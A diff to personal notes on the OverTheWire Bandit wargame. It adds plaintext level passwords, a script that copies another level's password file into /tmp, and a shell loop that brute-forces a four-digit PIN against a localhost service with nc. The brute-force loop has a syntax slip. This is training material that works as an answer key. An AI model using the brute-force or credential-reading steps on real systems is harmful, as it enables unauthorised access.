@@ -98,5 +98,20 @@ level 23: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 	>> cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 level 24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
       Shell script:
-      #!/bin/bash 
-
+      #!/bin/bash
+      cat /usr/bandit_pass/bandit24 >> /tmp/j-bandit/j-bandit-pass
+level 25: 
+      shell script (BRUTE-FORCE CRACK):
+      #!/bin/bash
+      pass24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+      pin=0
+      while [ $pin -lt 10000 ]; do
+      echo "Attempting PIN: $pin"
+      attempt="$(echo $pass24 $pin | nc localhost 30002)"
+      if ! [[ $attempt== *"Wrong!"* ]]; then
+      echo -ne "$attempt"
+      break
+      fi
+      ((pin++))
+      done
+      
